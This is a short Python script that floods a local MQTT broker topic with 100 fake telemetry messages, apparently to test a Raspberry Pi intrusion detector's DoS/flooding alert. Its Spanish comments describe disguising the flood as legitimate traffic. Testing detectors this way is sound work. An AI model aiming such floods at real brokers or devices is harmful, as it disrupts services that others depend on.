import paho.mqtt.client as mqtt
import json
import time

# --- CONFIGURATION ---
BROKER = "localhost"
TOPIC = "device_1/telemetry"

client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)

try:
    client.connect(BROKER, 1883)
    print("🚀 Starting Aggressive Flooding Attack...")

    for i in range(100):
        # Datos aparentemente normales para camuflar el ataque como tráfico legítimo
        flood_data = {
            "temperature": 25.0, 
            "humidity": 50.0, 
            "seq": i,
            "state": 4  # Mapeo: Normal/Normal
        }
        
        # Publicamos sin esperar apenas tiempo entre mensajes
        client.publish(TOPIC, json.dumps(flood_data), qos=0) 
        
        # Un delay extremadamente corto (0.1s) asegura que estemos muy por debajo 
        # del FLOOD_THRESHOLD (0.5s) definido en la RPI5.
        time.sleep(0.1) 
        
        if i % 20 == 0:
            print(f"📡 Sent {i} messages...")

    print("✅ Flood complete. Check RPi logs for '🚨 ALERT [DoS/Flooding]'.")

except Exception as e:
    print(f"❌ Error during flood: {e}")

finally:
    client.disconnect()